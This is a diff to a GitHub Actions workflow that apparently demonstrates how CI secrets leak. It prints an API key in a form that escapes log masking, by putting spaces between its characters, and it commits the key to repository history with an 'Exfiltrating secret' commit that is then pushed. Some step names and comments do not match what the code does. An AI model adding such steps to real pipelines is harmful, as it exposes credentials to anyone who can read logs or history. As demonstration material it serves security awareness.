@@ -1,15 +1,34 @@
-name: Security Leak Demo
-on: [push]
+name: Git Commit Leak
+on: [workflow_dispatch]
 
+permissions:
+  contents: write
+  
 jobs:
-  leak-job:
+  git-commit-leak-job:
     runs-on: ubuntu-latest
-    steps:
+    steps:   
+      - name: Checkout code
+        uses: actions/checkout@v4
+        
       - name: Attempting to print secret (Masked)
         run: echo "My secret is ${{ secrets.MY_API_KEY }}"
 
       - name: Bypass Masking (LEAK!)
-        # This converts the secret to base64, so GitHub's filter doesn't recognize it.
         run: |
           SECRET="${{ secrets.MY_API_KEY }}"
           echo "$SECRET" | sed 's/./& /g'
+
+      - name: Leak via Character Splitting
+        run: |
+          # Configure Git
+          git config --global user.name "Security-Bot"
+          git config --global user.email "bot@example.com"
+          
+          # Write secret to a file
+          echo "${{ secrets.MY_API_KEY }}" > leaked_secret.txt
+          
+          # Push to the repository
+          git add leaked_secret.txt
+          git commit -m "[Skip CI] Exfiltrating secret to repo history"
+          git push
